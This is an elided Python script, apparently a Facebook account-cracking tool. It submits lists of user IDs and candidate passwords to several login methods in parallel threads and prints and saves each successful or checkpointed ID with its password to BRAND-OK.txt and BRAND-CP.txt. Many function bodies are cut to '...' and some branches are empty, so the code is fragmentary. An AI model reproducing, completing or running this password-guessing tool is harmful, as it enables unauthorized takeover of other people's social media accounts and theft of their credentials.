#created by BRAND aka Aryan chaudhary
#open source by BRAND
#github= BRAND-XD
...
def BRAND():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100000812025846&mibextid=ZbWKwL")
    else:
...
def BRAND1():
	...
	BRANDlovesyou = input("[+] [CHOOSE] :- ")
	if BRANDlovesyou in ['y','Y','1','yes','YES','Yes']:
		BRAND_xd.append('y')
	else:
		BRAND_xd.append('n')
	...
	BRANDtop = input("[+] [CHOOSE] :- ")
	if BRANDtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{BRANDfire}')
		...
		for guru in user:
			...
			if BRANDfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif BRANDfire =='2':yaari.submit(p,uid,pwx,tl)
			elif BRANDfire =='3':yaari.submit(x,uid,pwx,tl)
			elif BRANDfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif BRANDfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif BRANDfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in BRAND-OK.txt,BRAND-CP.txt')
...
def BRAND5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if BRANDfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif BRANDfire =='2':manshera.submit(p,uid,pwx,tl)
			elif BRANDfire =='3':manshera.submit(x,uid,pwx,tl)
			elif BRANDfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif BRANDfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif BRANDfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[BRAND-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in BRAND_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[BRAND-CP] '+cid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-BRAND] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-BRAND] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-BRAND] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-BRAND] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-BRAND] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-BRAND] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
